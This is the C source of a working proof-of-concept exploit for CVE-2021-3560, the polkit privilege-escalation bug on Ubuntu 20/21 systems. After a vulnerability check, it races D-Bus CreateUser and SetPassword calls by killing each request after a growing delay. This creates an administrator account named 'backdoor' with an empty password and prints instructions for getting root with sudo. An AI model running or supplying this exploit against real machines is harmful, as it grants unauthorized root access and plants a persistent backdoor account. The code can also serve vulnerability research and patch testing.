// gcc -g cve-2021-3560_poc.c -o cve-2021-3560 /usr/lib/x86_64-linux-gnu/libdbus-1.so /usr/lib/x86_64-linux-gnu/libz.so
#include <dbus/dbus.h>
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <errno.h>
#include <sys/types.h>  
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>
#include <zlib.h>
#include <string.h>


void func_create_user(char* user, pid_t child, int delay);
void func_set_passwd();
void dbus_errquit();
void errquit(const char *msg);
void check();

DBusError dbus_err;
char *password="";
struct passwd *privil_user;

void green_printf () {
  printf("\033[0;32m");
}
void red_printf () {
  printf("\033[1;31m");
}
void yellow_printf() {
  printf("\033[1;33m");
}
void reset_printf () {
  printf("\033[0m");
}
void errquit(const char *msg) {
	perror(msg);
	exit(-1);
}
void dbus_errquit(){
    if (dbus_error_is_set(&dbus_err)){
        fprintf(stderr, "DBus error: %s\n",dbus_err.message);
        dbus_error_free(&dbus_err);
        exit(-1);
    }
}

void str_cut(char *str, int begin, int len)
{
    int l = strlen(str);

    if (len < 0) len = l - begin;
    if (begin + len > l) len = l - begin;
    memmove(str + begin, str + begin + len, l - len + 1);

    //return len;
}
// $ apt show policykit-1
// Package: policykit-1
// Version: 0.105-26ubuntu1.1
// /var/lib/apt/lists/us.archive.ubuntu.com_ubuntu_dists_focal-updates_main_binary-amd64_Packages
#define LENGTH 0x100
void check(){
    printf("[*] Checking whether this machine is vulnerable.\n");
    
    // Check OS version
    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen("/etc/os-release", "r");
    if (fp == NULL) errquit("fopen");

    // Read 2 lines
    getline(&line, &len, fp);
    read = getline(&line, &len, fp);

    //line = &line[9];
    str_cut(line, 0, 9);
    str_cut(line, 7, 0x100);
    printf("[*] Your OS version: %s\n", line);\
    if( strstr(line, "20")==0 && strstr(line, "21")==0 ){
        green_printf();
        printf("[*] This machine is not vulnerable!\n");
        reset_printf();
        exit(EXIT_FAILURE);
    }
    
    printf("[*] Check OS match.\n");
    fclose(fp);
    if(line) free(line);
    
    // Check Policykit Version
    const char * file_name = "/usr/share/doc/policykit-1/changelog.Debian.gz";
    gzFile file;
    file = gzopen (file_name, "r");
    if (!file) errquit("gzopen file: ");

    while(1){
        int err;                    
        int bytes_read;
        unsigned char buffer[LENGTH];
        //number of bytes decompressed into buf
        bytes_read = gzread(file, buffer, LENGTH );
        buffer[bytes_read] = '\0';
        if( strstr(buffer, "CVE-2021-3560") != 0){
            printf("[*] Policykit-1 version may not match.\n");
            green_printf();
            printf("[*] This machine is not vulnerable!\n");
            reset_printf();
            exit(EXIT_FAILURE);
        }
        //printf ("%s", buffer);
        if(bytes_read < LENGTH ){
            if(gzeof (file)) {
                break;
            }
            else{
                const char * error_msg;
                error_msg = gzerror(file, & err);
                if (err) {
                    fprintf (stderr, "Error: %s.\n", error_msg);
                    exit (EXIT_FAILURE);
                }
            }
        }
    }
    gzclose (file);
    printf("[*] Policykit-1 version might vulnerable!.\n");
    red_printf();
    printf("[*] This machine might be vulnerable!\n");
    reset_printf();
}

void func_set_passwd(uid_t uid, int delay){
    DBusConnection *conn;
    DBusMessage *request;
    DBusMessageIter arguments;
    dbus_error_init(&dbus_err);
    char dbus_path[60];
    pid_t pid = getpid();
    // --object-path /org/freedesktop/Accounts/User${UID}
    sprintf(dbus_path, "/org/freedesktop/Accounts/User%d", uid);
    
    // 1. Connects to a bus daemon and registers the client with it. 
    conn = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_err);
    if(!conn) dbus_errquit();

    // 2.Constructs a new message to invoke a method on a remote object.
    // dbus_message_new_method_call(destination,path,iface,method) 	
    request = dbus_message_new_method_call("org.freedesktop.Accounts", 
                                    dbus_path, 
                                    "org.freedesktop.Accounts.User",
                                    "SetPassword");
    if(!request) dbus_errquit();


	// 3.Initializes a DBusMessageIter for appending arguments to the end of a message. 
    dbus_message_iter_init_append(request, &arguments);

    // arg1: password
    if(!dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &password)){
        fprintf(stderr, "[*] DBus iter append failed.\n");
        exit(-1);
    }

    // arg2: hint
    if(!dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &password)){
        fprintf(stderr, "[*] DBus iter append failed.\n");
        exit(-1);
    }

    // Blocks until the outgoing message queue is empty. 
    dbus_connection_flush(conn);

    // Sends a message and blocks a certain time period while waiting for a reply. 
    dbus_connection_send_with_reply_and_block(conn, request, delay, &dbus_err);
    
    // suicide
    kill(pid, 9);
}

void func_create_user(char* user, pid_t child, int delay){
    // init dbus
    DBusConnection *conn;
    DBusMessage *request;
	DBusMessageIter arguments;
	//dbus_bool_t success = 1;
    pid_t pid = getpid();
    dbus_error_init(&dbus_err);

    // 1. dbus get system session
    // Connects to a bus daemon and registers the client with it. 
    conn = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_err);
    if(conn < 0) dbus_errquit();

    // 2.Constructs a new message to invoke a method on a remote object. 
    // dbus_message_new_method_call(destination,path,iface,method) 	
    request = dbus_message_new_method_call("org.freedesktop.Accounts"
                                    , "/org/freedesktop/Accounts"
                                    , "org.freedesktop.Accounts"
                                    , "CreateUser");

    if(request < 0) dbus_errquit();

	// 3.Initializes a DBusMessageIter for appending arguments to the end of a message. 
	dbus_message_iter_init_append(request, &arguments);

    // arg1: name
    if(!dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &user)) {
        fprintf(stderr, "[*] DBus iter append failed.\n");
        exit(-1);
    }

    // arg2: fullname
    if(!dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &user)) {
        fprintf(stderr, "[*] DBus iter append failed.\n");
        exit(-1);
    }

    // arg3: accountType, 0:Standard user;1:Administrator
    int user_type=1;
    if(!dbus_message_iter_append_basic(&arguments, DBUS_TYPE_INT32, &user_type)){
        fprintf(stderr, "[*] DBus iter append failed.\n");
        exit(-1);
    }

    // Blocks until the outgoing message queue is empty. 
    dbus_connection_flush(conn);

    // Sends a message and blocks a certain time period while waiting for a reply. 
    dbus_connection_send_with_reply_and_block(conn, request, delay, &dbus_err);

    kill (pid, SIGKILL);
}

int main(int argc, char *argv[]){
    pid_t child;
    char user[] = "backdoor";
    int delay=1;

    pid_t pid = getpid();

    // Check without exploit
    if (argc > 1){
        if(strstr(argv[1], "check")!=0){
            check();
        }
        exit(0);
    }

    // Check.
    check();

    green_printf();
    printf("[*] Creating user......\n");
    reset_printf();
    sleep(1);


    // CreateUser
    // break if user exist
    while(getpwnam(user)==NULL){
        child = fork();
        if (child < 0 ) errquit("fork@CreateUser");
        else if (child == 0){
            func_create_user(user, child, delay);
        }   
        else if (child > 0)
        {
            wait(NULL);
        }        
        delay = delay+1;
    }


    green_printf();
    printf("[*] wait for creating user...\n");
    reset_printf();
    sleep(1);

    printf("[*] Success!\n");
    printf("[*] user name is \"%s\"\n",user);
    
    
    // Set Passwd
    struct stat shadow;
    long int ori_size=0;
    uid_t uid = 0;
    stat("/etc/shadow", &shadow);
    ori_size = shadow.st_size;
    privil_user = getpwnam(user);
    uid = privil_user->pw_uid;
    printf("[*] uid is \"%d\"\n",uid);
    delay = 1;

    green_printf();
    printf("[*] Starting set null password......\n");
    reset_printf();

    // break if (ori_size > shadow.st_size)
    // user:!:12345:0:54321:7:::
    // user::12345:0:54321:7:::
    while(delay<150){
        child = fork();
        if (child < 0) errquit("fork@setpasswd");
        else if (child == 0){
            func_set_passwd(uid,delay);
        }
        else if (child > 0){
            wait(NULL);
        }
        stat("/etc/shadow", &shadow);
        //aft_size = shadow.st_size;
        if(ori_size > shadow.st_size) break;
        delay = delay + 1;
    }

    green_printf();
    printf("[*] Success! Login with no password!\n");
    reset_printf();
    puts("To run a command as administrator (user \"root\"), use \"sudo -i\"\n");

    return 0;
}